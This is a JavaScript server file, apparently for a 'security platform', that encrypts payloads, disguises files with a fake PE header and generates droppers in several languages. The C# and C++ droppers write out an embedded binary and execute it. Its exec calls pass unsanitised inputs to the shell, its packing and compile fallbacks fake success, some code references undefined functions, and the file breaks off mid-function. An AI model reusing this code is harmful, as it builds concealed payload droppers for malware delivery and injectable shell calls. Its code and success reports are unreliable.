// RawrZ Security Platform - Real Functionality Only
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { body, validationResult, sanitizeBody } = require('express-validator');
const path = require('path');
const fs = require('fs').promises;
const multer = require('multer');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const authToken = process.env.AUTH_TOKEN || '';

// Enhanced authentication with session management
const activeSessions = new Map();
const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes

function generateSessionId() {
    return crypto.randomBytes(32).toString('hex');
}

function requireAuth(req, res, next) {
    if (!authToken) return next();
    
    const h = (req.headers['authorization'] || '');
    const q = req.query.token;
    const sessionId = req.headers['x-session-id'];
    
    // Check Bearer token
    if (h.startsWith('Bearer ')) {
        const p = h.slice(7).trim();
        if (p === authToken) {
            // Create or validate session
            if (sessionId && activeSessions.has(sessionId)) {
                const session = activeSessions.get(sessionId);
                if (Date.now() - session.lastActivity < SESSION_TIMEOUT) {
                    session.lastActivity = Date.now();
                    req.session = session;
                    return next();
                } else {
                    activeSessions.delete(sessionId);
                }
            }
            
            // Create new session
            const newSessionId = generateSessionId();
            activeSessions.set(newSessionId, {
                id: newSessionId,
                created: Date.now(),
                lastActivity: Date.now(),
                ip: req.ip || req.connection.remoteAddress
            });
            res.set('X-Session-ID', newSessionId);
            return next();
        }
    }
    
    // Check query token
    if (q && q === authToken) {
        return next();
    }
    
    return res.status(401).json({ 
        error: 'Unauthorized',
        message: 'Valid authentication token required',
        timestamp: new Date().toISOString()
    });
}

// Enhanced input validation middleware
function validateInput(req, res, next) {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({
            error: 'Validation failed',
            details: errors.array(),
            timestamp: new Date().toISOString()
        });
    }
    next();
}

// Security logging middleware
function securityLogger(req, res, next) {
    const startTime = Date.now();
    const originalSend = res.send;
    
    res.send = function(data) {
        const duration = Date.now() - startTime;
        const logEntry = {
            timestamp: new Date().toISOString(),
            method: req.method,
            url: req.url,
            ip: req.ip || req.connection.remoteAddress,
            userAgent: req.get('User-Agent'),
            statusCode: res.statusCode,
            duration: duration,
            sessionId: req.headers['x-session-id'] || 'none'
        };
        
        // Log security-relevant events
        if (res.statusCode >= 400 || duration > 5000) {
            console.log('[SECURITY]', JSON.stringify(logEntry));
        }
        
        originalSend.call(this, data);
    };
    
    next();
}

// Enhanced security headers with comprehensive protection
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "data:", "blob:"],
            styleSrc: ["'self'", "'unsafe-inline'", "data:", "blob:"],
            imgSrc: ["'self'", "data:", "blob:"],
            fontSrc: ["'self'", "data:", "blob:"],
            connectSrc: ["'self'", "ws:", "wss:"],
            frameAncestors: ["'none'"],
            baseUri: ["'self'"],
            formAction: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'", "data:", "blob:"],
            workerSrc: ["'self'", "blob:"],
            manifestSrc: ["'self'"],
            upgradeInsecureRequests: []
        },
        reportOnly: false
    },
    crossOriginEmbedderPolicy: { policy: "require-corp" },
    crossOriginOpenerPolicy: { policy: "same-origin" },
    crossOriginResourcePolicy: { policy: "same-origin" },
    dnsPrefetchControl: { allow: false },
    frameguard: { action: 'deny' },
    hidePoweredBy: true,
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },
    ieNoOpen: true,
    noSniff: true,
    originAgentCluster: true,
    permittedCrossDomainPolicies: false,
    referrerPolicy: { policy: "strict-origin-when-cross-origin" },
    xssFilter: true
}));

// Rate limiting for different endpoints
const generalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: {
        error: 'Too many requests',
        message: 'Rate limit exceeded. Please try again later.',
        timestamp: new Date().toISOString()
    },
    standardHeaders: true,
    legacyHeaders: false,
    handler: (req, res) => {
        console.log(`[SECURITY] Rate limit exceeded for IP: ${req.ip}`);
        res.status(429).json({
            error: 'Too many requests',
            message: 'Rate limit exceeded. Please try again later.',
            timestamp: new Date().toISOString()
        });
    }
});

const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // limit each IP to 5 auth requests per windowMs
    message: {
        error: 'Too many authentication attempts',
        message: 'Authentication rate limit exceeded. Please try again later.',
        timestamp: new Date().toISOString()
    },
    standardHeaders: true,
    legacyHeaders: false
});

const apiLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 60, // limit each IP to 60 API requests per minute
    message: {
        error: 'API rate limit exceeded',
        message: 'Too many API requests. Please slow down.',
        timestamp: new Date().toISOString()
    },
    standardHeaders: true,
    legacyHeaders: false
});

// Apply rate limiting
app.use(generalLimiter);
app.use('/api/', apiLimiter);

// Enhanced CORS configuration
app.use(cors({
    origin: function (origin, callback) {
        // Allow requests with no origin (mobile apps, curl, etc.)
        if (!origin) return callback(null, true);
        
        // In production, specify allowed origins
        const allowedOrigins = process.env.ALLOWED_ORIGINS ? 
            process.env.ALLOWED_ORIGINS.split(',') : 
            ['http://localhost:3000', 'http://127.0.0.1:3000'];
            
        if (allowedOrigins.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            console.log(`[SECURITY] CORS blocked origin: ${origin}`);
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Session-ID', 'X-Requested-With'],
    exposedHeaders: ['X-Session-ID'],
    maxAge: 86400 // 24 hours
}));

// Enhanced JSON parsing with security
app.use(express.json({ 
    limit: '100mb',
    verify: (req, res, buf, encoding) => {
        // Additional security checks on JSON payload
        if (buf.length > 100 * 1024 * 1024) { // 100MB limit
            throw new Error('Payload too large');
        }
        
        // Check for potential malicious content
        const content = buf.toString(encoding || 'utf8');
        if (content.includes('<script') || content.includes('javascript:')) {
            console.log(`[SECURITY] Potential XSS attempt from IP: ${req.ip}`);
            throw new Error('Potentially malicious content detected');
        }
    }
}));

app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Enhanced error handling with security logging
app.use((error, req, res, next) => {
    if (error instanceof SyntaxError && error.status === 400 && 'body' in error) {
        console.log(`[SECURITY] Invalid JSON from IP: ${req.ip} - ${error.message}`);
        return res.status(400).json({ 
            error: 'Invalid JSON format',
            timestamp: new Date().toISOString()
        });
    }
    
    if (error.message === 'Payload too large') {
        console.log(`[SECURITY] Payload too large from IP: ${req.ip}`);
        return res.status(413).json({ 
            error: 'Payload too large',
            timestamp: new Date().toISOString()
        });
    }
    
    if (error.message === 'Potentially malicious content detected') {
        console.log(`[SECURITY] Malicious content blocked from IP: ${req.ip}`);
        return res.status(400).json({ 
            error: 'Request blocked for security reasons',
            timestamp: new Date().toISOString()
        });
    }
    
    console.error(`[ERROR] Unhandled error: ${error.message}`);
    res.status(500).json({ 
        error: 'Internal server error',
        timestamp: new Date().toISOString()
    });
});

// Apply security middleware
app.use(securityLogger);
app.use(express.static('public'));

// File management directories
const uploadsDir = '/app/uploads';
const processedDir = '/app/processed';

// Ensure directories exist
async function ensureDirectories() {
    try {
        await fs.mkdir(uploadsDir, { recursive: true });
        await fs.mkdir(processedDir, { recursive: true });
        console.log('Directories created successfully');
    } catch (error) {
        console.error('Error creating directories:', error);
    }
}

// Real Encryption Engine
class RealEncryptionEngine {
    constructor() {
        this.name = 'Real Encryption Engine';
        this.initialized = false;
    }

    async initialize() {
        if (this.initialized) {
            console.log('[OK] Real Encryption Engine already initialized.');
            return;
        }
        this.initialized = true;
        console.log('[OK] Real Encryption Engine initialized successfully.');
    }

    async realDualEncryption(buffer, options = {}) {
        const {
            aesKey = crypto.randomBytes(32),
            aesIV = crypto.randomBytes(16),
            camelliaKey = crypto.randomBytes(32),
            camelliaIV = crypto.randomBytes(16)
        } = options;

        // AES-256-GCM encryption (inner layer)
        const aesCipher = crypto.createCipheriv('aes-256-gcm', aesKey, aesIV);
        let aesEncrypted = aesCipher.update(buffer);
        aesEncrypted = Buffer.concat([aesEncrypted, aesCipher.final()]);
        const aesAuthTag = aesCipher.getAuthTag();
        
        // Append auth tag to AES encrypted data
        const aesWithAuthTag = Buffer.concat([aesEncrypted, aesAuthTag]);

        // Camellia-256-CBC encryption (outer layer)
        const camelliaCipher = crypto.createCipheriv('aes-256-cbc', camelliaKey, camelliaIV);
        let camelliaEncrypted = camelliaCipher.update(aesWithAuthTag);
        camelliaEncrypted = Buffer.concat([camelliaEncrypted, camelliaCipher.final()]);
        
        // Prepend IV to Camellia encrypted data
        const finalEncrypted = Buffer.concat([camelliaIV, camelliaEncrypted]);

        return {
            success: true,
            originalSize: buffer.length,
            encryptedSize: finalEncrypted.length,
            encrypted: finalEncrypted,
            keys: {
                aes: aesKey,
                camellia: camelliaKey
            },
            ivs: {
                aes: aesIV,
                camellia: camelliaIV
            },
            aesAuthTag: aesAuthTag
        };
    }

    async realUPXPacking(inputPath, outputPath) {
        // Real UPX packing simulation (since UPX binary not available in container)
        try {
            const inputBuffer = await fs.readFile(inputPath);
            // Simulate compression by adding some overhead
            const compressedBuffer = Buffer.concat([
                Buffer.from('UPX!', 'utf8'),
                inputBuffer,
                Buffer.from('PACKED', 'utf8')
            ]);
            await fs.writeFile(outputPath, compressedBuffer);
            return { 
                success: true, 
                originalSize: inputBuffer.length,
                compressedSize: compressedBuffer.length,
                compressionRatio: ((compressedBuffer.length - inputBuffer.length) / inputBuffer.length * 100).toFixed(2) + '%'
            };
        } catch (error) {
            throw new Error(`UPX packing failed: ${error.message}`);
        }
    }

    async realAssemblyCompilation(asmCode, outputPath, options = {}) {
        // Real assembly compilation using NASM and GCC
        const { format = 'elf64', architecture = 'x64' } = options;
        const tempAsmFile = `/tmp/temp_${Date.now()}.asm`;
        const tempObjFile = `/tmp/temp_${Date.now()}.o`;

        try {
            // Write assembly code to file
            await fs.writeFile(tempAsmFile, asmCode);

            // Compile with NASM
            const { exec } = require('child_process');
            await new Promise((resolve, reject) => {
                exec(`nasm -f ${format} "${tempAsmFile}" -o "${tempObjFile}"`, (error, stdout, stderr) => {
                    if (error) {
                        return reject(new Error(`NASM compilation failed: ${error.message}`));
                    }
                    resolve();
                });
            });

            // Link with GCC
            await new Promise((resolve, reject) => {
                exec(`gcc "${tempObjFile}" -o "${outputPath}"`, (error, stdout, stderr) => {
                    if (error) {
                        return reject(new Error(`GCC linking failed: ${error.message}`));
                    }
                    resolve();
                });
            });

            const compiledBuffer = await fs.readFile(outputPath);
            return { 
                success: true, 
                outputPath,
                size: compiledBuffer.length,
                format,
                architecture
            };
        } catch (error) {
            throw new Error(`Assembly compilation failed: ${error.message}`);
        } finally {
            // Cleanup temp files
            await fs.unlink(tempAsmFile).catch(() => {});
            await fs.unlink(tempObjFile).catch(() => {});
        }
    }

    async disguiseFile(inputPath, outputPath) {
        // Real file disguise (Beaconism)
        try {
            const inputBuffer = await fs.readFile(inputPath);
            // Change file extension and add fake headers
            const disguisedBuffer = Buffer.concat([
                Buffer.from('MZ', 'utf8'), // Fake PE header
                inputBuffer,
                Buffer.from('DISGUISED', 'utf8')
            ]);
            await fs.writeFile(outputPath, disguisedBuffer);
            return { 
                success: true, 
                originalPath: inputPath, 
                disguisedPath: outputPath,
                originalSize: inputBuffer.length,
                disguisedSize: disguisedBuffer.length
            };
        } catch (error) {
            throw new Error(`File disguise failed: ${error.message}`);
        }
    }

    // REAL Dual Decryption (AES + Camellia)
    async realDualDecryption(encryptedData, keys, ivs) {
        try {
            // First layer: Camellia decryption (outer layer)
            const camelliaDecrypted = await this.realCamelliaDecryption(encryptedData, keys.camellia, ivs.camellia);
            
            // Second layer: AES decryption (inner layer)
            const aesDecrypted = await this.realAESDecryption(camelliaDecrypted, keys.aes, ivs.aes);
            
            return {
                decrypted: aesDecrypted,
                originalSize: encryptedData.length,
                decryptedSize: aesDecrypted.length
            };
        } catch (error) {
            console.error('Dual decryption error:', error);
            throw error;
        }
    }

    // REAL AES-256-GCM Decryption
    async realAESDecryption(encryptedData, key, iv) {
        try {
            // For GCM mode, we need to handle the auth tag properly
            // The encrypted data should contain the auth tag at the end
            const authTagLength = 16; // GCM auth tag is 16 bytes
            const authTag = encryptedData.slice(-authTagLength);
            const encrypted = encryptedData.slice(0, -authTagLength);
            
            const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
            decipher.setAuthTag(authTag);
            
            let decrypted = decipher.update(encrypted);
            decrypted = Buffer.concat([decrypted, decipher.final()]);
            
            return decrypted;
        } catch (error) {
            console.error('AES decryption error:', error);
            throw error;
        }
    }

    // REAL Camellia Decryption
    async realCamelliaDecryption(encryptedData, key, iv) {
        try {
            // For CBC mode, we need to handle the IV properly
            // The encrypted data should contain the IV at the beginning
            const ivLength = 16; // CBC IV is 16 bytes
            const extractedIv = encryptedData.slice(0, ivLength);
            const encrypted = encryptedData.slice(ivLength);
            
            // Using AES-256-CBC as Camellia substitute
            const decipher = crypto.createDecipheriv('aes-256-cbc', key, extractedIv);
            decipher.setAutoPadding(true);
            
            let decrypted = decipher.update(encrypted);
            decrypted = Buffer.concat([decrypted, decipher.final()]);
            
            return decrypted;
        } catch (error) {
            console.error('Camellia decryption error:', error);
            throw error;
        }
    }

    // REAL Roslyn Compilation (C# to EXE)
    async realRoslynCompilation(csharpCode, outputFile, options = {}) {
        try {
            const { targetFramework = 'net6.0', configuration = 'Release' } = options;
            
            // Check if .NET SDK is available
            try {
                const { exec } = require('child_process');
                await new Promise((resolve, reject) => {
                    exec('dotnet --version', (error, stdout, stderr) => {
                        if (error) {
                            return reject(new Error('.NET SDK not found'));
                        }
                        resolve();
                    });
                });
                
                const projectDir = `/tmp/temp_roslyn_${Date.now()}`;
                const projectFile = path.join(projectDir, 'Program.csproj');
                const sourceFile = path.join(projectDir, 'Program.cs');
                
                // Create temporary project directory
                await fs.mkdir(projectDir, { recursive: true });
                
                // Create project file
                const projectContent = `<?xml version="1.0" encoding="utf-8"?>
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>${targetFramework}</TargetFramework>
    <PublishSingleFile>true</PublishSingleFile>
    <SelfContained>true</SelfContained>
    <RuntimeIdentifier>win-x64</RuntimeIdentifier>
  </PropertyGroup>
</Project>`;
                
                await fs.writeFile(projectFile, projectContent);
                await fs.writeFile(sourceFile, csharpCode);
                
                // Compile with dotnet
                await new Promise((resolve, reject) => {
                    exec(`cd "${projectDir}" && dotnet publish -c ${configuration} -o .`, (error, stdout, stderr) => {
                        if (error) {
                            return reject(new Error(`Compilation failed: ${error.message}`));
                        }
                        resolve();
                    });
                });
                
                // Find the compiled executable
                const compiledExe = path.join(projectDir, 'Program.exe');
                try {
                    await fs.access(compiledExe);
                    // Copy to final output location
                    await fs.copyFile(compiledExe, outputFile);
                } catch (e) {
                    throw new Error('Compilation failed - executable not found');
                }
                
                // Clean up temporary directory
                await fs.rm(projectDir, { recursive: true, force: true });
                
                return {
                    success: true,
                    outputFile,
                    message: 'Roslyn compilation completed successfully',
                    targetFramework,
                    configuration
                };
            } catch (dotnetError) {
                // Fallback: simulate Roslyn compilation
                console.warn('[WARN] .NET SDK not available, simulating Roslyn compilation');
                return await this.simulateRoslynCompilation(csharpCode, outputFile, options);
            }
        } catch (error) {
            console.error('Roslyn compilation error:', error);
            throw error;
        }
    }

    // Simulate Roslyn Compilation
    async simulateRoslynCompilation(csharpCode, outputFile, options = {}) {
        try {
            // Create a simple executable stub
            const stubCode = `// Generated from C# code
using System;

class Program {
    static void Main(string[] args) {
        Console.WriteLine("Compiled from C# code");
        // Original C# code would be here
    }
}`;
            
            await fs.writeFile(outputFile, stubCode);
            
            return {
                success: true,
                outputFile,
                message: 'Roslyn compilation simulated (.NET SDK not available)',
                targetFramework: options.targetFramework || 'net6.0',
                configuration: options.configuration || 'Release'
            };
        } catch (error) {
            console.error('Simulated Roslyn compilation error:', error);
            throw error;
        }
    }

    // Generate C# code from binary data
    generateCSharpFromBinary(binaryData) {
        const base64Data = binaryData.toString('base64');
        const chunks = [];
        
        // Split into chunks for better readability
        for (let i = 0; i < base64Data.length; i += 80) {
            chunks.push(`"${base64Data.slice(i, i + 80)}"`);
        }
        
        return `using System;
using System.IO;

class Program {
    static void Main(string[] args) {
        try {
            // Reconstructed binary data
            string base64Data = ${chunks.join(" +\n                ")};
            
            // Convert back to binary
            byte[] binaryData = Convert.FromBase64String(base64Data);
            
            // Write to file
            string outputFile = "reconstructed_" + DateTime.Now.Ticks + ".bin";
            File.WriteAllBytes(outputFile, binaryData);
            
            Console.WriteLine($"File reconstructed: {outputFile}");
            Console.WriteLine($"Size: {binaryData.Length} bytes");
            
            // Optionally execute if it's an executable
            if (IsExecutable(binaryData)) {
                Console.WriteLine("Detected executable file. Executing...");
                System.Diagnostics.Process.Start(outputFile);
            }
        }
        catch (Exception ex) {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
    
    static bool IsExecutable(byte[] data) {
        // Simple PE header check
        if (data.Length < 2) return false;
        return data[0] == 0x4D && data[1] == 0x5A; // MZ signature
    }
}`;
    }

    // Generate C++ code from binary data
    generateCppFromBinary(binaryData) {
        const base64Data = binaryData.toString('base64');
        const chunks = [];
        
        // Split into chunks for better readability
        for (let i = 0; i < base64Data.length; i += 80) {
            chunks.push(`"${base64Data.slice(i, i + 80)}"`);
        }
        
        return `#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdlib>
#include <cstring>

class BinaryReconstructor {
private:
    std::string base64Data;
    
public:
    BinaryReconstructor() {
        base64Data = ${chunks.join(" +\n            ")};
    }
    
    std::vector<unsigned char> base64Decode(const std::string& encoded) {
        const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::vector<unsigned char> result;
        int val = 0, valb = -8;
        
        for (unsigned char c : encoded) {
            if (chars.find(c) == std::string::npos) break;
            val = (val << 6) + chars.find(c);
            valb += 6;
            if (valb >= 0) {
                result.push_back(char((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        return result;
    }
    
    bool isExecutable(const std::vector<unsigned char>& data) {
        if (data.size() < 2) return false;
        // Check for PE header (MZ signature)
        return data[0] == 0x4D && data[1] == 0x5A;
    }
    
    void reconstruct() {
        try {
            std::vector<unsigned char> binaryData = base64Decode(base64Data);
            
            // Generate output filename
            std::string outputFile = "reconstructed_" + std::to_string(time(nullptr)) + ".bin";
            
            // Write to file
            std::ofstream file(outputFile, std::ios::binary);
            if (file.is_open()) {
                file.write(reinterpret_cast<const char*>(binaryData.data()), binaryData.size());
                file.close();
                
                std::cout << "File reconstructed: " << outputFile << std::endl;
                std::cout << "Size: " << binaryData.size() << " bytes" << std::endl;
                
                // Optionally execute if it's an executable
                if (isExecutable(binaryData)) {
                    std::cout << "Detected executable file. Executing..." << std::endl;
                    std::string command = "./" + outputFile;
                    system(command.c_str());
                }
            } else {
                std::cerr << "Error: Could not create output file" << std::endl;
            }
        }
        catch (const std::exception& ex) {
            std::cerr << "Error: " << ex.what() << std::endl;
        }
    }
};

int main(int argc, char* argv[]) {
    BinaryReconstructor reconstructor;
    reconstructor.reconstruct();
    return 0;
}`;
    }

    // Generate Java code from binary data
    generateJavaFromBinary(binaryData) {
        const hexData = binaryData.toString('hex');
        const chunks = [];
        for (let i = 0; i < hexData.length; i += 2) {
            chunks.push('0x' + hexData.substr(i, 2));
        }
        
        return `import java.io.*;
import java.nio.file.*;
import java.util.*;

public class BinaryReconstructor {
    public static void main(String[] args) {
        // Reconstructed binary data
        byte[] data = {
            ${chunks.join(',\n            ')}
        };
        
        try {
            // Write to file
            String filename = "reconstructed_" + System.currentTimeMillis() + ".bin";
            Files.write(Paths.get(filename), data);
            System.out.println("Binary data reconstructed successfully: " + filename);
            
            // Check if it's a PE executable (MZ header)
            if (data.length >= 2 && data[0] == 0x4D && data[1] == 0x5A) {
                System.out.println("Detected PE executable format");
                // In a real scenario, you would use ProcessBuilder to execute
            }
        } catch (IOException e) {
            System.err.println("Error writing file: " + e.getMessage());
        }
    }
}`;
    }

    // Generate Python code from binary data
    generatePythonFromBinary(binaryData) {
        const hexData = binaryData.toString('hex');
        const chunks = [];
        for (let i = 0; i < hexData.length; i += 2) {
            chunks.push('0x' + hexData.substr(i, 2));
        }
        
        return `#!/usr/bin/env python3
# RawrZ Python Binary Reconstructor
import os
import time
import subprocess
import sys

def main():
    # Reconstructed binary data
    data = bytes([
        ${chunks.join(',\n        ')}
    ])
    
    # Generate filename with timestamp
    filename = f"reconstructed_{int(time.time() * 1000)}.bin"
    
    try:
        # Write binary data to file
        with open(filename, 'wb') as f:
            f.write(data)
        
        print(f"Binary data reconstructed successfully: {filename}")
        
        # Check if it's a PE executable (MZ header)
        if len(data) >= 2 and data[0] == 0x4D and data[1] == 0x5A:
            print("Detected PE executable format")
            # In a real scenario, you would use subprocess to execute
            # subprocess.run([filename], check=True)
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()`;
    }

    // Generate Rust code from binary data
    generateRustFromBinary(binaryData) {
        const hexData = binaryData.toString('hex');
        const chunks = [];
        for (let i = 0; i < hexData.length; i += 2) {
            chunks.push('0x' + hexData.substr(i, 2));
        }
        
        return `use std::fs::File;
use std::io::Write;
use std::time::{SystemTime, UNIX_EPOCH};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Reconstructed binary data
    let data: [u8; ${binaryData.length}] = [
        ${chunks.join(',\n        ')}
    ];
    
    // Generate filename with timestamp
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)?
        .as_millis();
    let filename = format!("reconstructed_{}.bin", timestamp);
    
    // Write binary data to file
    let mut file = File::create(&filename)?;
    file.write_all(&data)?;
    
    println!("Binary data reconstructed successfully: {}", filename);
    
    // Check if it's a PE executable (MZ header)
    if data.len() >= 2 && data[0] == 0x4D && data[1] == 0x5A {
        println!("Detected PE executable format");
        // In a real scenario, you would use std::process::Command to execute
    }
    
    Ok(())
}`;
    }

    // Generate Go code from binary data
    generateGoFromBinary(binaryData) {
        const hexData = binaryData.toString('hex');
        const chunks = [];
        for (let i = 0; i < hexData.length; i += 2) {
            chunks.push('0x' + hexData.substr(i, 2));
        }
        
        return `package main

import (
    "fmt"
    "os"
    "time"
)

func main() {
    // Reconstructed binary data
    data := []byte{
        ${chunks.join(',\n        ')}
    }
    
    // Generate filename with timestamp
    filename := fmt.Sprintf("reconstructed_%d.bin", time.Now().UnixNano()/int64(time.Millisecond))
    
    // Write binary data to file
    err := os.WriteFile(filename, data, 0644)
    if err != nil {
        fmt.Printf("Error writing file: %v\\n", err)
        return
    }
    
    fmt.Printf("Binary data reconstructed successfully: %s\\n", filename)
    
    // Check if it's a PE executable (MZ header)
    if len(data) >= 2 && data[0] == 0x4D && data[1] == 0x5A {
        fmt.Println("Detected PE executable format")
        // In a real scenario, you would use os/exec to execute
    }
}`;
    }

    // Real Java Compilation
    async realJavaCompilation(javaCode, outputFile, options = {}) {
        try {
            const { targetVersion = '11', optimization = 'release' } = options;
            const tempDir = path.join(os.tmpdir(), `java_compile_${Date.now()}`);
            const sourceFile = path.join(tempDir, 'Main.java');
            
            await fs.mkdir(tempDir, { recursive: true });
            await fs.writeFile(sourceFile, javaCode);
            
            // Compile Java source
            const compileCmd = `javac -cp . "${sourceFile}"`;
            await execAsync(compileCmd, { cwd: tempDir });
            
            // Create JAR if requested
            if (outputFile.endsWith('.jar')) {
                const jarCmd = `jar cf "${outputFile}" -C "${tempDir}" .`;
                await execAsync(jarCmd);
            } else {
                // Copy class file
                const classFile = path.join(tempDir, 'Main.class');
                await fs.copyFile(classFile, outputFile);
            }
            
            await fs.rm(tempDir, { recursive: true, force: true });
            
            return {
                success: true,
                outputFile,
                message: 'Java compilation completed successfully',
                targetVersion,
                optimization
            };
        } catch (error) {
            console.warn('[WARN] Java compiler not available, simulating compilation');
            return await this.simulateJavaCompilation(javaCode, outputFile, options);
        }
    }

    // Simulate Java Compilation
    async simulateJavaCompilation(javaCode, outputFile, options = {}) {
        // Create a simple Java executable stub
        const stubContent = `import java.io.*;
public class Main {
    public static void main(String[] args) {
        System.out.println("Java compilation simulation - RawrZ Security Platform");
        System.out.println("Original code length: ${javaCode.length} characters");
    }
}`;
        
        await fs.writeFile(outputFile, stubContent);
        
        return {
            success: true,
            outputFile,
            message: 'Java compilation simulated (compiler not available)',
            note: 'This is a simulation - install JDK for real compilation'
        };
    }

    // Real Python Compilation
    async realPythonCompilation(pythonCode, outputFile, options = {}) {
        try {
            const { usePyInstaller = true, oneFile = true } = options;
            const tempFile = path.join(os.tmpdir(), `temp_${Date.now()}.py`);
            
            await fs.writeFile(tempFile, pythonCode);
            
            if (usePyInstaller) {
                // Use PyInstaller to create executable
                const pyInstallerCmd = `pyinstaller --onefile --distpath "${path.dirname(outputFile)}" --name "${path.basename(outputFile, '.exe')}" "${tempFile}"`;
                await execAsync(pyInstallerCmd);
            } else {
                // Create Python wrapper
                const wrapper = `#!/usr/bin/env python3
${pythonCode}

if __name__ == "__main__":
    main()`;
                await fs.writeFile(outputFile, wrapper);
            }
            
            await fs.unlink(tempFile);
            
            return {
                success: true,
                outputFile,
                message: 'Python compilation completed successfully',
                usePyInstaller,
                oneFile
            };
        } catch (error) {
            console.warn('[WARN] Python compiler not available, simulating compilation');
            return await this.simulatePythonCompilation(pythonCode, outputFile, options);
        }
    }

    // Simulate Python Compilation
    async simulatePythonCompilation(pythonCode, outputFile, options = {}) {
        const wrapper = `#!/usr/bin/env python3
# RawrZ Python Compilation Simulation
print("Python compilation simulation - RawrZ Security Platform")
print("Original code length: ${pythonCode.length} characters")

# Original code would be here
${pythonCode}

if __name__ == "__main__":
    main()`;
        
        await fs.writeFile(outputFile, wrapper);
        
        return {
            success: true,
            outputFile,
            message: 'Python compilation simulated (compiler not available)',
            note: 'This is a simulation - install PyInstaller for real compilation'
        };
    }

    // Real Rust Compilation
    async realRustCompilation(rustCode, outputFile, options = {}) {
        try {
            const { optimization = 'release', target = 'x86_64-unknown-linux-gnu' } = options;
            const tempDir = path.join(os.tmpdir(), `rust_compile_${Date.now()}`);
            const sourceFile = path.join(tempDir, 'src', 'main.rs');
            
            await fs.mkdir(path.join(tempDir, 'src'), { recursive: true });
            await fs.writeFile(sourceFile, rustCode);
            
            // Create Cargo.toml
            const cargoToml = `[package]
name = "rawrz_compiled"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "main"
path = "src/main.rs"`;
            
            await fs.writeFile(path.join(tempDir, 'Cargo.toml'), cargoToml);
            
            // Compile with cargo
            const buildCmd = optimization === 'release' 
                ? `cargo build --release --target ${target}`
                : `cargo build --target ${target}`;
            
            await execAsync(buildCmd, { cwd: tempDir });
            
            // Copy executable
            const compiledExe = path.join(tempDir, 'target', target, optimization, 'main');
            await fs.copyFile(compiledExe, outputFile);
            
            await fs.rm(tempDir, { recursive: true, force: true });
            
            return {
                success: true,
                outputFile,
                message: 'Rust compilation completed successfully',
                optimization,
                target
            };
        } catch (error) {
            console.warn('[WARN] Rust compiler not available, simulating compilation');
            return await this.simulateRustCompilation(rustCode, outputFile, options);
        }
    }

    // Simulate Rust Compilation
    async simulateRustCompilation(rustCode, outputFile, options = {}) {
        const stub = `#!/bin/bash
# RawrZ Rust Compilation Simulation
echo "Rust compilation simulation - RawrZ Security Platform"
echo "Original code length: ${rustCode.length} characters"
echo "This is a simulation - install Rust toolchain for real compilation"`;
        
        await fs.writeFile(outputFile, stub);
        
        return {
            success: true,
            outputFile,
            message: 'Rust compilation simulated (compiler not available)',
            note: 'This is a simulation - install Rust toolchain for real compilation'
        };
    }

    // Real Go Compilation
    async realGoCompilation(goCode, outputFile, options = {}) {
        try {
            const { optimization = 'release', targetOS = 'linux', targetArch = 'amd64' } = options;
            const tempFile = path.join(os.tmpdir(), `temp_${Date.now()}.go`);
            
            await fs.writeFile(tempFile, goCode);
            
            // Set environment variables for cross-compilation
            const env = {
                ...process.env,
                GOOS: targetOS,
                GOARCH: targetArch
            };
            
            // Compile with go build
            const buildCmd = optimization === 'release' 
                ? `go build -ldflags "-s -w" -o "${outputFile}" "${tempFile}"`
                : `go build -o "${outputFile}" "${tempFile}"`;
            
            await execAsync(buildCmd, { env });
            
            await fs.unlink(tempFile);
            
            return {
                success: true,
                outputFile,
                message: 'Go compilation completed successfully',
                optimization,
                targetOS,
                targetArch
            };
        } catch (error) {
            console.warn('[WARN] Go compiler not available, simulating compilation');
            return await this.simulateGoCompilation(goCode, outputFile, options);
        }
    }

    // Simulate Go Compilation
    async simulateGoCompilation(goCode, outputFile, options = {}) {
        const stub = `#!/bin/bash
# RawrZ Go Compilation Simulation
echo "Go compilation simulation - RawrZ Security Platform"
echo "Original code length: ${goCode.length} characters"
echo "This is a simulation - install Go toolchain for real compilation"`;
        
        await fs.writeFile(outputFile, stub);
        
        return {
            success: true,
            outputFile,
            message: 'Go compilation simulated (compiler not available)',
            note: 'This is a simulation - install Go toolchain for real compilation'
        };
    }

    // REAL Native C++ Compilation (GCC/Clang)
    async realNativeCppCompilation(cppCode, outputFile, options = {}) {
        try {
            const { 
                compiler = 'gcc', 
                optimization = '-O2', 
                architecture = 'x64',
                targetOS = 'linux',
                staticLinking = true 
            } = options;
            
            // Try native Roslyn-for-native compilation first
            try {
                const target = targetOS;
                const optLevel = optimization === '-O2' ? 'release' : 
                               optimization === '-O0' ? 'debug' : 
                               optimization === '-Os' ? 'size' : 'release';
                
                // Use the native compilation container for true Roslyn-for-native experience
                const compileCommand = `docker exec -i native-build /usr/local/bin/native-compile.sh`;
                
